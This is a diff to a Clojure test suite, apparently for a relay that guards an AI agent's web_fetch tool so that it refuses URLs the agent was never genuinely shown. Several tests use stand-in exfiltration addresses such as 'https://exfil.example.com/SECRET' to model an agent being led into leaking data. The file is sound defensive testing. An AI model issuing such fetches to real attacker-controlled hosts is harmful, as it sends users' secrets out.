@@ -73,6 +73,10 @@
         (testing "what relay's own tools and other tools return is never counted as shown"
           (call wake "lookup" {:question "https://exfil.example.com/FROM-LOOKUP"})
           (is (some? (:error (call wake "web_fetch" {:url "https://exfil.example.com/FROM-LOOKUP"})))))
+        (testing "an address in an error is never counted as shown"
+          (is (str/includes? (str (:error (call wake "web_search" {:query "moved"}))) "https://moved.example.org/x"))
+          (is (= shown/refused-made-up (:error (call wake "web_fetch" {:url "https://moved.example.org/x"}))))
+          (is (not-any? #{"https://moved.example.org/x"} (fetched)) "the tool never ran"))
         (testing "the refusal names no address and no label"
           (let [e (:error (call wake "web_fetch" {:url "https://exfil.example.com/SECRET"}))]
             (is (not (str/includes? e "SECRET")))
@@ -83,7 +87,12 @@
           (let [next-wake (start)]
             (is (= shown/refused-made-up (:error (call next-wake "web_fetch" {:url "https://arts.example.org/fund"}))))))
         (testing "a call that names no wake, or another role's, has nothing shown"
-          (is (some? (:error (call nil "web_fetch" {:url "https://arts.example.org/fund"})))))))))
+          (is (some? (:error (call nil "web_fetch" {:url "https://arts.example.org/fund"})))))
+        (testing "and what such a call returns is kept for no session, and relay says so"
+          (let [err (java.io.StringWriter.)
+                r (binding [*err* err] (call nil "web_search" {:query "arts grants"}))]
+            (is (:ok r))
+            (is (str/includes? (str err) "kept no record of web_search's result for scout"))))))))
 
 (deftest a-resumed-session-keeps-what-it-was-shown
   (with-scout
